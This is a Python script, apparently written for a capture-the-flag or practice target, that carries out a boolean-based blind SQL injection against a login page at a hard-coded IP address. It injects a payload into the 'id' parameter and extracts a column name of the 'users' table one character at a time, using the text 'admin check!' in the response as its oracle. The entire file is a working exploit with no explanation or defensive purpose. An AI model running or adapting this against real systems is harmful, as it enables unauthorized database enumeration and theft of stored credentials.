import requests

url = 'http://13.209.81.224:6060/index.php'
found_column_name = ''
column_index = 1
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
position = 1  # We will start with the first character of the column name

while True:
    for char in chars:
        payload = f"admin' AND (ASCII(SUBSTRING((select column_name from information_schema.columns where table_name = 'users' limit 1,1), {position}, 1)) = ASCII('{char}')) -- "
        params = {'id': payload, 'password': '123'}
        response = requests.get(url, params=params)
        
        if 'admin check!' in response.text:  # Modify this line to match the specific success message
            found_column_name += char
            print(f"Column name so far: {found_column_name}")
            position += 1
            break
    else:
        # Exit the loop if no matching character is found
        break

print(f"Final column name: {found_column_name}")
